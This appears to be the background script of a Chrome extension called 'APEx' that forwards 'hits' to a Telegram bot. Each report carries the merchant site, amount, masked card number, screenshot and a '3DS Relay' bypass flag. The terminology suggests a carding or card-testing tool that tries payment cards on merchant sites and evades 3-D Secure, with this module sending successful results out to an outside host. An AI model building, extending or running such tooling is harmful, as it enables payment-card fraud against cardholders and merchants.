(function () {
  var TOKEN_KEY = 'APEx_tg_bot_token';
  var CHAT_KEY = 'APEx_tg_user_id';
  var ENABLED_KEY = 'APEx_tg_forward_enabled';
  var STATUS_KEY = 'APEx_tg_last_status';
  var ERROR_KEY = 'APEx_tg_last_error';
  var TIME_KEY = 'APEx_tg_last_ts';

  function isToken(value) {
    return /^\d{6,}:[A-Za-z0-9_-]{20,}$/.test(String(value || '').trim());
  }

  function isChatId(value) {
    return /^(@[A-Za-z0-9_]{5,32}|-?\d{5,20})$/.test(String(value || '').trim());
  }

  function escapeHtml(value) {
    return String(value == null ? '' : value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function maskCard(value) {
    var digits = String(value || '').replace(/\D/g, '');
    if (digits.length >= 12) return digits.slice(0, 6) + '******' + digits.slice(-4);
    if (digits.length >= 6) return digits.slice(0, 6);
    return '';
  }

  function siteFromData(data) {
    if (data && data.site) return String(data.site);
    try {
      if (data && data.url) return new URL(data.url).hostname.replace(/^www\./, '');
    } catch (e) {}
    return 'unknown';
  }

  function amountFromData(data) {
    if (!data || data.amount == null || data.amount === '') return '';
    if (typeof data.amount === 'number') return '$' + data.amount.toFixed(2);
    return String(data.amount).slice(0, 40);
  }

  function buildHitMessage(data) {
    data = data || {};
    var card = data.maskedCard || data.cardMasked || maskCard(data.card || data.bin || '');
    var amount = amountFromData(data);
    var lines = [
      '<b>APEx hit</b>',
      'Status: <code>' + escapeHtml(data.response || 'success') + '</code>',
      'Site: <code>' + escapeHtml(siteFromData(data)) + '</code>',
    ];
    if (data.type === 'three_ds' || data.response === 'three_ds') {
      lines.push('Bypass: <code>3DS Relay</code>');
    }
    if (amount) lines.push('Amount: <code>' + escapeHtml(amount) + '</code>');
    if (card) lines.push('Card: <code>' + escapeHtml(card) + '</code>');
    if (data.screenshot) lines.push('Screenshot: <a href="' + escapeHtml(String(data.screenshot).substring(0, 200)) + '">Open</a>');
    lines.push('Time: <code>' + escapeHtml(new Date().toLocaleString()) + '</code>');
    return lines.join('\n');
  }

  async function saveStatus(status, error) {
    var update = {};
    update[STATUS_KEY] = status || '';
    update[ERROR_KEY] = error || '';
    update[TIME_KEY] = new Date().toISOString();
    try {
      await chrome.storage.local.set(update);
    } catch (e) {}
  }

  async function getSettings() {
    var data = await chrome.storage.local.get([TOKEN_KEY, CHAT_KEY, ENABLED_KEY]);
    var token = String(data[TOKEN_KEY] || '').trim();
    var chatId = String(data[CHAT_KEY] || '').trim();
    var enabled = data[ENABLED_KEY] === true || data[ENABLED_KEY] === 'true';
    if (!enabled) return { ok: false, reason: 'Telegram alerts are disabled.' };
    if (!isToken(token)) return { ok: false, reason: 'Telegram bot token is not configured.' };
    if (!isChatId(chatId)) return { ok: false, reason: 'Telegram chat ID is not configured.' };
    return { ok: true, token: token, chatId: chatId };
  }

  async function sendTelegramText(text) {
    var settings = await getSettings();
    if (!settings.ok) {
      await saveStatus('disabled', settings.reason);
      return settings;
    }
    var response = await fetch('https://api.telegram.org/bot' + encodeURIComponent(settings.token) + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: settings.chatId,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    var body = await response.json().catch(function () { return {}; });
    if (!response.ok || body.ok === false) {
      var reason = body.description || ('Telegram HTTP ' + response.status);
      await saveStatus('error', reason);
      return { ok: false, reason: reason };
    }
    await saveStatus('ok', '');
    return { ok: true };
  }

  chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    if (!message || !message.type) return false;

    if (message.type === 'APEx_TG_TEST') {
      (async function () {
        try {
          var result = await sendTelegramText('<b>APEx Telegram test</b>\nYour user-configured Telegram alerts are working.');
          sendResponse(result);
        } catch (e) {
          await saveStatus('error', e.message || String(e));
          sendResponse({ ok: false, reason: e.message || String(e) });
        }
      })();
      return true;
    }

    if (message.type === 'APEx_RECORD_HIT') {
      (async function () {
        try {
          var settings = await getSettings();
          if (!settings.ok) return;
          var text = buildHitMessage(message.data || {});
          if (message.data && message.data.screenshot) {
            var formData = new FormData();
            formData.append('chat_id', settings.chatId);
            formData.append('photo', message.data.screenshot);
            formData.append('reply_to_message_id', '');
            formData.append('caption', text);
            var response = await fetch('https://api.telegram.org/bot' + encodeURIComponent(settings.token) + '/sendPhoto', {
              method: 'POST',
              body: formData,
            });
            var body = await response.json().catch(function () { return {}; });
            if (!response.ok || body.ok === false) {
              throw new Error(body.description || 'Telegram HTTP ' + response.status);
            }
          } else {
            await sendTelegramText(text);
          }
        } catch (e) {
          await saveStatus('error', e.message || String(e));
        }
      })();
      return false;
    }

    return false;
  });
})();
